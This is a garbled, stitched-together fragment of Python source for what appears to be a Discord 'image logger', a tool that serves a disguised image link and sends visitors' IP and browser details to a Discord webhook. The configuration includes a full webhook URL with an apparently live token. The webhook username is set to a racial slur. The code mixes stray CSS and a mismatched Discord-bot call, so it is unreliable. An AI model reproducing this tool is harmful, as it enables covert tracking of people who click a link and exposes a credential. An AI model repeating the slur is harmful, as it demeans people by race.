...
config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1420608114956439592/iIHlTB4QEI0ZUGvZsMqVpy7Zw5TOj0tNbKJaFoRfBsSqtfle5dRNDf1zOquvchcIPPmL",
    "image": "https://pbs.twimg.com/media/GCy1uKQa0AA6p4M?format=jpg&name=large", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "a fucking nigger that steal from people", # Set this to the name you want the webhook to have
...
height: 100vh;
            ...
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                ...
                if config["message"]["richMessage"] and result:
                    message = message.replace("{discord_username}", message.author.name)
